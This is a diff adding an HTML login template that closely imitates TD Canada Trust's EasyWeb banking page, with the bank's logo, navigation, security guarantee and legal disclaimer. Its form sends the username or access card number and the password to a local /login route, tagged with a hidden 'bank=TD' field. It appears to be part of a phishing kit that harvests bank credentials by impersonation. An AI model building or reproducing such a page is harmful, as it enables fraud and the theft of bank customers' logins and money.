@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>EasyWeb Login</title>
+  <!-- Link your CSS file -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='td.css') }}">
+</head>
+<body>
+
+<!-- DESKTOP/DEFAULT TOP WHITE BAR (hidden on mobile) -->
+<div class="td-top-white-bar">
+  <div class="td-top-white-inner">
+    <!-- Left side: Personal | Business | Investing -->
+    <div class="white-left-links">
+      <a href="#">Personal</a>
+      <a href="#">Business</a>
+      <a href="#">Investing</a>
+    </div>
+    <!-- Right side: small Canada flag + “Français ▼” -->
+    <div class="white-right-locale">
+      <img src="/static/images/canada-flag.png" alt="Canada" class="flag-icon">
+      <a href="#">Français ▼</a>
+    </div>
+  </div>
+</div>
+
+<!-- DESKTOP/DEFAULT GREEN BAR (hidden on mobile) -->
+<header class="td-main-green-bar">
+  <div class="td-greenbar-inner">
+    <!-- Left: TD Logo -->
+    <div class="td-logo-container">
+      <img src="/static/images/td-logo.png" alt="TD Logo">
+    </div>
+
+    <!-- Middle Nav (My Accounts, How To, etc.) -->
+    <nav class="td-greenbar-nav">
+      <a href="#">My Accounts</a>
+      <a href="#">How To</a>
+      <a href="#">Products ▼</a>
+      <a href="#">Solutions ▼</a>
+    </nav>
+
+    <!-- Right side: 
+         A <picture> element to swap desktop vs. mobile images. 
+         Desktop fallback = login-picture.png
+         Under 768px, switch to mobile-login.png 
+    -->
+    <div class="td-greenbar-right">
+      <picture>
+        <source 
+          srcset="/static/images/mobile-login.png" 
+          media="(max-width: 768px)"
+        >
+        <!-- Desktop fallback -->
+        <img 
+          src="/static/images/login-picture.png" 
+          alt="Login" 
+          class="desktop-login-image"
+        >
+      </picture>
+    </div>
+  </div>
+</header>
+
+<!-- ================================
+     MOBILE HEADER & MENU (shown only under 768px)
+=================================== -->
+<header class="td-mobile-header">
+  <div class="mobile-header-inner">
+    <!-- LEFT side: hamburger + TD logo side by side -->
+    <div class="mobile-header-left">
+      <button class="mobile-hamburger" onclick="toggleMobileNav()">
+        <img 
+          src="/static/images/hamburger-icon.png" 
+          alt="Menu" 
+          class="hamburger-icon"
+        >
+      </button>
+      <img 
+        src="/static/images/td-logo.png" 
+        alt="TD Logo" 
+        class="td-mobile-logo"
+      >
+    </div>
+    
+    <!-- RIGHT side: mobile-login.png -->
+    <img 
+      src="/static/images/mobile-login.png" 
+      alt="Mobile Login" 
+      class="mobile-login-icon"
+    >
+  </div>
+</header>
+  
+<!-- SLIDING NAV OVERLAY (hidden by default) -->
+<nav id="mobileNavOverlay" class="mobile-nav-overlay">
+  <div class="mobile-nav-header">
+    <span>TD: Personal</span>
+    <button class="close-nav-btn" onclick="toggleMobileNav()">✕</button>
+  </div>
+
+  <hr class="overlay-divider"/>
+
+  <!-- Example “Search” row at the top of the overlay -->
+  <div class="mobile-nav-search">
+    <input type="text" placeholder="Search" />
+  </div>
+
+  <!-- Your main mobile menu links -->
+  <ul class="mobile-nav-links">
+    <li><a href="#">Home</a></li>
+    <li><a href="#">My Accounts</a></li>
+    <li><a href="#">How To</a></li>
+    <li><a href="#">Products</a></li>
+    <li><a href="#">Solutions</a></li>
+    <li><a href="#">Bank Accounts</a></li>
+    <li><a href="#">Credit Cards</a></li>
+    <li><a href="#">Mortgages</a></li>
+    <li><a href="#">Borrowing</a></li>
+    <li><a href="#">Saving &amp; Investing</a></li>
+    <li><a href="#">Insurance</a></li>
+    <li><a href="#">All Products</a></li>
+    <li><a href="#">Find Us</a></li>
+    <li><a href="#">Help</a></li>
+    <li>COUNTRY: Canada ▼</li>
+  </ul>
+</nav>
+<!-- END MOBILE HEADER & MENU -->
+
+
+<!-- MAIN CONTENT WRAPPER -->
+<main class="td-content-wrapper">
+  <h1 class="td-easyweb-title">EasyWeb Login</h1>
+
+  <!-- Big Light-Green Box with 2 columns -->
+  <div class="td-login-box">
+    <!-- LEFT: Login -->
+    <div class="login-column">
+      <!-- ADD THE HIDDEN INPUT FOR 'bank=TD' -->
+      <form action="/login" method="POST" class="login-form">
+        <input type="hidden" name="bank" value="TD">
+
+        <div class="input-group">
+          <label>Username or Access Card</label>
+          <input 
+            type="text" 
+            name="card_number"
+            placeholder="Enter username or card number"
+            required
+          >
+        </div>
+
+        <p class="desc-optional">
+          <a href="#">+ Description (Optional)</a>
+        </p>
+
+        <div class="input-group">
+          <label>Password</label>
+          <div class="password-row">
+            <input 
+              type="password" 
+              name="password" 
+              placeholder="Enter password"
+              required
+            >
+            <span class="pw-eye">&#128065;</span>
+          </div>
+        </div>
+
+        <div class="remember-row">
+          <input type="checkbox" id="rememberMe">
+          <label for="rememberMe">Remember me</label>
+        </div>
+
+        <!-- Login button with lock image -->
+        <button type="submit" class="btn-login">
+          <img 
+            src="/static/images/login-lock.png" 
+            alt="Lock" 
+            class="login-lock-img"
+          >
+          Login
+        </button>
+
+        <p class="forgot-link">
+          <a href="#">Forgot your username or password?</a>
+        </p>
+
+        <p class="td-security">
+          <img src="/static/images/lock-icon.png" alt="Lock" class="security-lock-img">
+          <a href="#">TD Online and Mobile Security Guarantee: You are protected</a>
+        </p>
+      </form>
+    </div>
+
+    <!-- Vertical Divider -->
+    <div class="vertical-divider"></div>
+
+    <!-- RIGHT: “Welcome” + Register + sub-sections -->
+    <div class="help-column">
+      <div class="help-header">
+        <h2>Welcome to EasyWeb, let's get started.</h2>
+        <button class="btn-register">Register online now</button>
+      </div>
+      <p>
+        If you've received your temporary password, use it to log in along 
+        with your Access Card number. You'll then be prompted to create a new Password.
+      </p>
+
+      <!-- Divider line before "Login Help" to isolate text from sections -->
+      <hr class="help-divider"/>
+
+      <!-- Make each help-box clickable on mobile -->
+      <div class="help-box" onclick="toggleHelpBox(this)">
+        <h3>Login Help</h3>
+        <ul>
+          <li><a href="#">Get Login Help &gt;</a></li>
+          <li><a href="#">Reset Password &gt;</a></li>
+        </ul>
+      </div>
+
+      <div class="help-box" onclick="toggleHelpBox(this)">
+        <h3>Enhanced Security</h3>
+        <ul>
+          <li><a href="#">Two-Step Verification FAQs &gt;</a></li>
+          <li><a href="#">TD Authenticate app &gt;</a></li>
+          <li><a href="#">Improve Your Protection Against Online Fraud &gt;</a></li>
+        </ul>
+      </div>
+
+      <div class="help-box" onclick="toggleHelpBox(this)">
+        <h3>Explore mobile banking with the TD app now</h3>
+        <p>Take banking and investing almost anywhere</p>
+      </div>
+    </div>
+  </div> <!-- end td-login-box -->
+
+  <!-- “With TD Direct Investing…” Offer -->
+  <section class="td-offer-section">
+    <div class="offer-image">
+      <img src="/static/images/td-woman.png" alt="Woman on laptop">
+    </div>
+    <div class="offer-content">
+      <h2>With TD Direct Investing, you could get 1% cash back.</h2>
+      <p>For new and existing clients. <em>*Conditions apply. Limited time offer.</em></p>
+      <button class="btn-offer">Get offer</button>
+    </div>
+  </section>
+
+  <!-- Disclaimer -->
+  <div class="td-disclaimer">
+    <p>
+      By using EasyWeb, our secured financial services site, offered by TD Canada Trust and its affiliates, you agree 
+      to the terms and services of the 
+      <a href="#">Financial Services Terms</a>, 
+      <a href="#">Access Agreement</a>, 
+      <a href="#">Digital Banking Agreement</a>
+      and/or the 
+      <a href="#">Business Access Services Schedule</a>
+      and/or the
+      <a href="#">Terms and Agreement and Disclosure</a> for mutual funds accounts held with TD Investment Services Inc.
+    </p>
+  </div>
+</main>
+
+<!-- New Green Footer with Chair above Privacy and Security,
+     and "Contact us ›" beside "Need to talk to us directly?" -->
+<footer class="td-bottom-footer">
+  <div class="footer-inner">
+    <!-- Chair Image -->
+    <div class="footer-chair-container">
+      <img src="/static/images/td-chair.png" alt="Green Chair" class="footer-chair-img">
+    </div>
+
+    <!-- Contact and Connect Sections -->
+    <div class="footer-contact-connect">
+      <!-- "Need to talk to us directly?" and "Contact us ›" -->
+      <div class="footer-contact-row">
+        <h2>Need to talk to us directly?</h2>
+        <a href="#" class="contact-us-link">Contact us &rsaquo;</a>
+      </div>
+
+      <!-- "Connect with TD" and Social Icons -->
+      <div class="footer-social">
+        <span>Connect with TD</span>
+        <div class="social-icons">
+          <a href="#"><img src="/static/images/icon-twitter.png" alt="Twitter"></a>
+          <a href="#"><img src="/static/images/icon-facebook.png" alt="Facebook"></a>
+          <a href="#"><img src="/static/images/icon-instagram.png" alt="Instagram"></a>
+          <a href="#"><img src="/static/images/icon-youtube.png" alt="YouTube"></a>
+          <a href="#"><img src="/static/images/icon-linkedin.png" alt="LinkedIn"></a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="footer-links">
+      <ul>
+        <li><a href="#">Privacy and Security</a></li>
+        <li><a href="#">Legal</a></li>
+        <li><a href="#">Accessibility</a></li>
+        <li><a href="#">CDIC member</a></li>
+        <li><a href="#">About Us</a></li>
+        <li><a href="#">We're Hiring</a></li>
+        <li><a href="#">Manage online experience</a></li>
+        <li><a href="#">Site Index</a></li>
+      </ul>
+    </div>
+  </div>
+</footer>
+
+<!-- Tiny script to open/close the mobile overlay and the help boxes -->
+<script>
+  function toggleMobileNav() {
+    const overlay = document.getElementById('mobileNavOverlay');
+    overlay.classList.toggle('open');
+  }
+
+  function toggleHelpBox(box) {
+    // Adds or removes an .open class on the help-box
+    box.classList.toggle('open');
+  }
+</script>
+
+</body>
+</html>
